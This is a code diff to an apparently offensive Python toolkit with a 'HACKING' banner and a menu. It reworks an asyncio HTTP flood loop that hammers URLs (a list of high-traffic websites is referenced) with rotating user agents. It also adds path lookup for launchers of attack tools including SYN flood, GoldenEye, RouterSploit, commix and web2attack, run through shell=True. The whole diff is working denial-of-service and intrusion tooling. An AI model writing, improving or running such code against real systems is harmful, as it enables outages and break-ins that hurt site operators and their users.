@@ -7,6 +7,8 @@ import asyncio
 import random
 import subprocess
 from googlesearch import search
+import shutil
+import os
 
 # List of high-traffic websites for testing
 default_urls = [
@@ -47,14 +49,13 @@ def web_crawler(start_url, max_depth=2):
 async def fetch(session, url, ip=None):
     headers = {'User-Agent': random.choice(default_user_agents)}
     connector = aiohttp.TCPConnector(local_addr=(ip, 0)) if ip else None  # Bind to the IP if provided
-    async with aiohttp.ClientSession(connector=connector) as session:
-        while True:
-            try:
-                async with session.get(url, headers=headers) as response:
-                    await response.text()
-            except Exception as e:
-                print(f"Error: {e}")
-                await asyncio.sleep(random.uniform(0.5, 2))  # Rate limiting
+    while True:
+        try:
+            async with session.get(url, headers=headers) as response:
+                await response.text()
+        except Exception as e:
+            print(f"Error: {e}")
+            await asyncio.sleep(random.uniform(0.5, 2))  # Rate limiting
 
 async def start_flood(url, ip=None):
     async with aiohttp.ClientSession() as session:
@@ -99,9 +100,16 @@ def display_books(books):
         print(f"Link: {book}")
         print("-" * 20)
 
+# Helper function to find tool paths
+def find_tool_path(tool_name):
+    path = shutil.which(tool_name)
+    if not path:
+        raise FileNotFoundError(f"'{tool_name}' not found in PATH")
+    return path
+
 # Define functions for additional tools
 def run_asyncrone():
-    command = "/usr/local/bin/asyncrone"  # Adjust the path as necessary
+    command = find_tool_path("asyncrone")
     subprocess.run(command, shell=True)
 
 def run_syn_flood(target_ip):
@@ -117,7 +125,7 @@ def run_goldeneye(target_url):
     subprocess.run(command, shell=True)
 
 def run_routersploit():
-    command = "/usr/local/bin/rsf"  # Adjust the path as necessary
+    command = find_tool_path("rsf")
     subprocess.run(command, shell=True)
 
 def run_websploit():
@@ -129,18 +137,18 @@ def run_commix(target_url):
     subprocess.run(command, shell=True)
 
 def run_web2attack():
-    command = "/usr/local/bin/web2attack"  # Adjust the path as necessary
+    command = find_tool_path("web2attack")
     subprocess.run(command, shell=True)
 
 def display_ui():
     while True:
         print("""
-         ██╗░░██╗░█████╗░░█████╗░██╗░░██╗██╗███╗░░██╗░██████╗░░░░░░░██████╗
-         ██║░░██║██╔══██╗██╔══██╗██║░██╔╝██║████╗░██║██╔════╝░░░░░░░╚══██╔══╝
-         ███████║███████║██║░░╚═╝█████═╝░██║██╔██╗██║██║░░██╗░█████╗░░░██║░░░
-         ██╔══██║██╔══██║██║░░██╗██╔═██╗░██║██║╚████║██║░░╚██╗╚════╝░░░██║░░░
-         ██║░░██║██║░░██║╚█████╔╝██║░╚██╗██║██║░╚███║╚██████╔╝░░░░░░░░░██║░░░
-         ╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░╚═════╝░░░░░░░░░╚═╝░░░
+         ██╗░░██╗░█████╗░░█████╗░██╗░░██╗██╗███╗░░██╗░██████╗░░░░░░░███████╗
+         ██║░░██║██╔══██╗██╔══██╗██║░██╔╝██║████╗░██║██╔════╝░░░░░░░╚══███╔╝
+         ███████║███████║██║░░╚═╝█████═╝░██║██╔██╗██║██║░░██╗░█████╗░░░███╔╝░
+         ██╔══██║██╔══██║██║░░██╗██╔═██╗░██║██║╚████║██║░░╚██╗╚════╝░░███╔╝░░
+         ██║░░██║██║░░██║╚█████╔╝██║░╚██╗██║██║░╚███║╚██████╔╝░░░░░░░███████╗
+         ╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░╚═════╝░░░░░░░╚══════╝
 
         [1] Ethernet-based Desktop
         [2] IP-based
